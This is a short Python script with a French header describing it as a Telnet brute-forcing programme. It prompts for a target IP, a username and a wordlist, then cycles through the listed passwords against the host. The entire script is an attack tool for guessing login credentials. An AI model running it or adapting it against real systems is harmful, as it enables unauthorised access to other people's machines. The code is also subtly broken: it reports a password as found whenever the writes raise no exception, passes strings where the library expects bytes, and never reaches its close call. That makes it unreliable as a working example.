# Programme de brute forcing du protocole Telnet

import os, sys, telnetlib
from telnetlib import Telnet

def telnetconnect(password):
    try:
        telnet = Telnet(host,port=23)
    except:
        resp = 2
        return resp

    try:
        telnet.write(username)
        telnet.write(password)
        resp = 0
    except:
        resp = 1

    return resp
    telnet.close()
    
 

global host, username, line, worldist, nwline
nwline = "\n"

try:
    host = input("Enter Target IP Adress > ")
    user = input("Enter Username > ")
    username = user + nwline
    wordlist = input("Enter Wordlist path > ")

    if os.path.exists(wordlist) == False:
        sys.exit("This file doesn't exist")

except KeyboardInterrupt:
    sys.exit("User interrupted the program")

inputfile = open(wordlist, "r")

for i in inputfile.readlines():
    passw = i.strip("\n")
    password = passw + nwline

    try:
        response = telnetconnect(password)

        if response == 0:
            print("\n[!] User : {0} | Password Found : {1} \n".format(username,password))
            sys.exit(0)

        elif response == 1:
            print("[x] User : {0} | Password : {1} | Password Incorrect".format(username,password))

        elif response == 2:
            sys.exit("Connection Cannot be Etablished with {0}".format(host))
    except KeyboardInterrupt:
        sys.exit("User Interrupted the program")
    
inputfile.close()
